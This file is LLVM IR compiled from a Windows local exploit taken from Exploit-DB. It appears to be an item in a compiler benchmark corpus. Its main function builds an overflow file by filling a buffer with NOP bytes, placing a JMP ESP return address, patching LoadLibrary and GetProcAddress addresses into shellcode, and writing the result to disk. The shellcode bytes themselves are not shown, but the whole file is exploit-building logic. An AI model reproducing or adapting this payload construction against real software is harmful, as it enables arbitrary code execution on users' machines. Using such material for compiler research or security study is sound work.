; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19610.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_19610.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAXBUF = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [23 x i8] c"usage : %s outputfile\0A\00", align 1
@HEAD = common dso_local global i8* null, align 8
@JMPESP_ADR = common dso_local global i32 0, align 4
@RETADR = common dso_local global i64 0, align 8
@FAKE_ADR = common dso_local global i32 0, align 4
@LoadLibrary = common dso_local global i64 0, align 8
@GetProcAddress = common dso_local global i64 0, align 8
@exploit_code = common dso_local global i8* null, align 8
@GetProcAddress_fcp = common dso_local global i64* null, align 8
@filename = common dso_local global i8* null, align 8
@string_buffer = common dso_local global i8* null, align 8
@exploit_data = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [2 x i8] c"_\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"Can not write file '%s'\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"Done.\0A\00", align 1
@FALSE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @MAXBUF, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %6, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %7, align 8
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %27

21:                                               ; preds = %2
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0), i8* %24)
  %26 = call i32 @exit(i32 1) #4
  unreachable

27:                                               ; preds = %2
  %28 = load i32, i32* @MAXBUF, align 4
  %29 = call i32 @memset(i8* %18, i32 144, i32 %28)
  %30 = load i32, i32* @MAXBUF, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %18, i64 %31
  store i8 0, i8* %32, align 1
  %33 = load i8*, i8** @HEAD, align 8
  %34 = call i32 @memcpy(i8* %18, i8* %33, i32 4)
  %35 = load i32, i32* @JMPESP_ADR, align 4
  store i32 %35, i32* %10, align 4
  %36 = load i32, i32* %10, align 4
  %37 = and i32 %36, 255
  %38 = trunc i32 %37 to i8
  %39 = load i64, i64* @RETADR, align 8
  %40 = getelementptr inbounds i8, i8* %18, i64 %39
  store i8 %38, i8* %40, align 1
  %41 = load i32, i32* %10, align 4
  %42 = lshr i32 %41, 8
  %43 = and i32 %42, 255
  %44 = trunc i32 %43 to i8
  %45 = load i64, i64* @RETADR, align 8
  %46 = add i64 %45, 1
  %47 = getelementptr inbounds i8, i8* %18, i64 %46
  store i8 %44, i8* %47, align 1
  %48 = load i32, i32* %10, align 4
  %49 = lshr i32 %48, 16
  %50 = and i32 %49, 255
  %51 = trunc i32 %50 to i8
  %52 = load i64, i64* @RETADR, align 8
  %53 = add i64 %52, 2
  %54 = getelementptr inbounds i8, i8* %18, i64 %53
  store i8 %51, i8* %54, align 1
  %55 = load i32, i32* %10, align 4
  %56 = lshr i32 %55, 24
  %57 = and i32 %56, 255
  %58 = trunc i32 %57 to i8
  %59 = load i64, i64* @RETADR, align 8
  %60 = add i64 %59, 3
  %61 = getelementptr inbounds i8, i8* %18, i64 %60
  store i8 %58, i8* %61, align 1
  %62 = load i64, i64* @RETADR, align 8
  %63 = add i64 %62, 6
  %64 = getelementptr inbounds i8, i8* %18, i64 %63
  store i8 -21, i8* %64, align 1
  %65 = load i64, i64* @RETADR, align 8
  %66 = add i64 %65, 7
  %67 = getelementptr inbounds i8, i8* %18, i64 %66
  store i8 4, i8* %67, align 1
  %68 = load i32, i32* @FAKE_ADR, align 4
  store i32 %68, i32* %10, align 4
  %69 = load i32, i32* %10, align 4
  %70 = and i32 %69, 255
  %71 = trunc i32 %70 to i8
  %72 = load i64, i64* @RETADR, align 8
  %73 = add i64 %72, 8
  %74 = getelementptr inbounds i8, i8* %18, i64 %73
  store i8 %71, i8* %74, align 1
  %75 = load i32, i32* %10, align 4
  %76 = lshr i32 %75, 8
  %77 = and i32 %76, 255
  %78 = trunc i32 %77 to i8
  %79 = load i64, i64* @RETADR, align 8
  %80 = add i64 %79, 9
  %81 = getelementptr inbounds i8, i8* %18, i64 %80
  store i8 %78, i8* %81, align 1
  %82 = load i32, i32* %10, align 4
  %83 = lshr i32 %82, 16
  %84 = and i32 %83, 255
  %85 = trunc i32 %84 to i8
  %86 = load i64, i64* @RETADR, align 8
  %87 = add i64 %86, 10
  %88 = getelementptr inbounds i8, i8* %18, i64 %87
  store i8 %85, i8* %88, align 1
  %89 = load i32, i32* %10, align 4
  %90 = lshr i32 %89, 24
  %91 = and i32 %90, 255
  %92 = trunc i32 %91 to i8
  %93 = load i64, i64* @RETADR, align 8
  %94 = add i64 %93, 11
  %95 = getelementptr inbounds i8, i8* %18, i64 %94
  store i8 %92, i8* %95, align 1
  %96 = load i64, i64* @LoadLibrary, align 8
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %11, align 4
  %98 = load i64, i64* @GetProcAddress, align 8
  %99 = trunc i64 %98 to i32
  store i32 %99, i32* %12, align 4
  %100 = load i32, i32* %11, align 4
  %101 = and i32 %100, 255
  %102 = trunc i32 %101 to i8
  %103 = load i8*, i8** @exploit_code, align 8
  %104 = getelementptr inbounds i8, i8* %103, i64 31
  store i8 %102, i8* %104, align 1
  %105 = load i32, i32* %11, align 4
  %106 = lshr i32 %105, 8
  %107 = and i32 %106, 255
  %108 = trunc i32 %107 to i8
  %109 = load i8*, i8** @exploit_code, align 8
  %110 = getelementptr inbounds i8, i8* %109, i64 32
  store i8 %108, i8* %110, align 1
  %111 = load i32, i32* %11, align 4
  %112 = lshr i32 %111, 16
  %113 = and i32 %112, 255
  %114 = trunc i32 %113 to i8
  %115 = load i8*, i8** @exploit_code, align 8
  %116 = getelementptr inbounds i8, i8* %115, i64 33
  store i8 %114, i8* %116, align 1
  %117 = load i32, i32* %11, align 4
  %118 = lshr i32 %117, 24
  %119 = and i32 %118, 255
  %120 = trunc i32 %119 to i8
  %121 = load i8*, i8** @exploit_code, align 8
  %122 = getelementptr inbounds i8, i8* %121, i64 34
  store i8 %120, i8* %122, align 1
  store i32 0, i32* %13, align 4
  br label %123

123:                                              ; preds = %173, %27
  %124 = load i32, i32* %13, align 4
  %125 = icmp ult i32 %124, 4
  br i1 %125, label %126, label %176

126:                                              ; preds = %123
  %127 = load i32, i32* %12, align 4
  %128 = and i32 %127, 255
  %129 = trunc i32 %128 to i8
  %130 = load i8*, i8** @exploit_code, align 8
  %131 = load i64*, i64** @GetProcAddress_fcp, align 8
  %132 = load i32, i32* %13, align 4
  %133 = zext i32 %132 to i64
  %134 = getelementptr inbounds i64, i64* %131, i64 %133
  %135 = load i64, i64* %134, align 8
  %136 = getelementptr inbounds i8, i8* %130, i64 %135
  store i8 %129, i8* %136, align 1
  %137 = load i32, i32* %12, align 4
  %138 = lshr i32 %137, 8
  %139 = and i32 %138, 255
  %140 = trunc i32 %139 to i8
  %141 = load i8*, i8** @exploit_code, align 8
  %142 = load i64*, i64** @GetProcAddress_fcp, align 8
  %143 = load i32, i32* %13, align 4
  %144 = zext i32 %143 to i64
  %145 = getelementptr inbounds i64, i64* %142, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = add i64 %146, 1
  %148 = getelementptr inbounds i8, i8* %141, i64 %147
  store i8 %140, i8* %148, align 1
  %149 = load i32, i32* %12, align 4
  %150 = lshr i32 %149, 16
  %151 = and i32 %150, 255
  %152 = trunc i32 %151 to i8
  %153 = load i8*, i8** @exploit_code, align 8
  %154 = load i64*, i64** @GetProcAddress_fcp, align 8
  %155 = load i32, i32* %13, align 4
  %156 = zext i32 %155 to i64
  %157 = getelementptr inbounds i64, i64* %154, i64 %156
  %158 = load i64, i64* %157, align 8
  %159 = add i64 %158, 2
  %160 = getelementptr inbounds i8, i8* %153, i64 %159
  store i8 %152, i8* %160, align 1
  %161 = load i32, i32* %12, align 4
  %162 = lshr i32 %161, 24
  %163 = and i32 %162, 255
  %164 = trunc i32 %163 to i8
  %165 = load i8*, i8** @exploit_code, align 8
  %166 = load i64*, i64** @GetProcAddress_fcp, align 8
  %167 = load i32, i32* %13, align 4
  %168 = zext i32 %167 to i64
  %169 = getelementptr inbounds i64, i64* %166, i64 %168
  %170 = load i64, i64* %169, align 8
  %171 = add i64 %170, 3
  %172 = getelementptr inbounds i8, i8* %165, i64 %171
  store i8 %164, i8* %172, align 1
  br label %173

173:                                              ; preds = %126
  %174 = load i32, i32* %13, align 4
  %175 = add i32 %174, 1
  store i32 %175, i32* %13, align 4
  br label %123

176:                                              ; preds = %123
  %177 = load i8*, i8** @filename, align 8
  %178 = call i32 @strlen(i8* %177)
  %179 = load i8*, i8** @string_buffer, align 8
  %180 = call i32 @strlen(i8* %179)
  %181 = add nsw i32 %178, %180
  %182 = trunc i32 %181 to i8
  store i8 %182, i8* %8, align 1
  %183 = load i8*, i8** @exploit_data, align 8
  %184 = call i32 @strlen(i8* %183)
  %185 = trunc i32 %184 to i8
  store i8 %185, i8* %9, align 1
  %186 = load i8*, i8** @string_buffer, align 8
  %187 = load i8*, i8** @filename, align 8
  %188 = call i32 @strcat(i8* %186, i8* %187)
  %189 = load i8*, i8** @string_buffer, align 8
  %190 = call i32 @strcat(i8* %189, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %191 = load i8*, i8** @string_buffer, align 8
  %192 = load i8*, i8** @exploit_data, align 8
  %193 = call i32 @strcat(i8* %191, i8* %192)
  %194 = load i8*, i8** @exploit_code, align 8
  %195 = load i8*, i8** @string_buffer, align 8
  %196 = call i32 @strcat(i8* %194, i8* %195)
  %197 = load i8, i8* %8, align 1
  %198 = load i8*, i8** @exploit_code, align 8
  %199 = getelementptr inbounds i8, i8* %198, i64 28
  store i8 %197, i8* %199, align 1
  %200 = load i8, i8* %9, align 1
  %201 = load i8*, i8** @exploit_code, align 8
  %202 = getelementptr inbounds i8, i8* %201, i64 109
  store i8 %200, i8* %202, align 1
  %203 = load i8, i8* %8, align 1
  %204 = zext i8 %203 to i32
  %205 = add nsw i32 %204, 1
  %206 = trunc i32 %205 to i8
  %207 = load i8*, i8** @exploit_code, align 8
  %208 = getelementptr inbounds i8, i8* %207, i64 119
  store i8 %206, i8* %208, align 1
  %209 = load i64, i64* @RETADR, align 8
  %210 = getelementptr inbounds i8, i8* %18, i64 %209
  %211 = getelementptr inbounds i8, i8* %210, i64 12
  %212 = load i8*, i8** @exploit_code, align 8
  %213 = load i8*, i8** @exploit_code, align 8
  %214 = call i32 @strlen(i8* %213)
  %215 = call i32 @memcpy(i8* %211, i8* %212, i32 %214)
  %216 = load i8**, i8*** %5, align 8
  %217 = getelementptr inbounds i8*, i8** %216, i64 1
  %218 = load i8*, i8** %217, align 8
  %219 = call i32* @fopen(i8* %218, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  store i32* %219, i32** %14, align 8
  %220 = icmp eq i32* %219, null
  br i1 %220, label %221, label %227

221:                                              ; preds = %176
  %222 = load i8**, i8*** %5, align 8
  %223 = getelementptr inbounds i8*, i8** %222, i64 1
  %224 = load i8*, i8** %223, align 8
  %225 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* %224)
  %226 = call i32 @exit(i32 1) #4
  unreachable

227:                                              ; preds = %176
  %228 = load i32, i32* @MAXBUF, align 4
  %229 = load i32*, i32** %14, align 8
  %230 = call i32 @fwrite(i8* %18, i32 1, i32 %228, i32* %229)
  %231 = load i32*, i32** %14, align 8
  %232 = call i32 @fclose(i32* %231)
  %233 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %234 = load i32, i32* @FALSE, align 4
  store i32 %234, i32* %3, align 4
  %235 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %235)
  %236 = load i32, i32* %3, align 4
  ret i32 %236
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #2

declare dso_local i32 @fclose(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
